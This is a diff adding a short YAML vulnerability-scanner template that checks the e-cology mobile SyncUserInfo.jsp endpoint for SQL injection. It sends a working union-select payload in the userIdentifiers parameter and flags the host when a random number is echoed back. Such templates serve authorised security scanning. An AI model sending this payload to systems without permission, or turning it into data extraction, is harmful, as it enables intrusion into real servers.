@@ -1,0 +1,14 @@
+cve-id: ecology-syncuserinfo-sqli
+set:
+  r1: randomInt(40000, 44800)
+rules:
+  - method: GET
+    path: >-
+      /mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str({{r1}}),null
+    follow_redirects: true
+    expression: |
+      response.status == 200 && response.body.bcontains(b"{{r1}}")
+severity:
+  high
+type: 
+  sqli
